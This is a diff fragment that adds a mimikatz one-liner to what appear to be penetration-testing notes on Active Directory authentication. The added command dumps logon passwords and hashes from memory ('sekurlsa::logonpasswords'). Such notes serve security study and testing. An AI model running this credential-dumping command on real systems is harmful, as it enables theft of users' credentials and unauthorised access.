@@ -553,6 +553,12 @@ Address:  192.168.1.110
 
 ### Active Directory Authentication
 
+mimikatz inline
+
+```
+PS C:\temp\mimikatz> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
+```
+
 #### Cached Credential Storage and Retrieval
 
 on a domain workstation
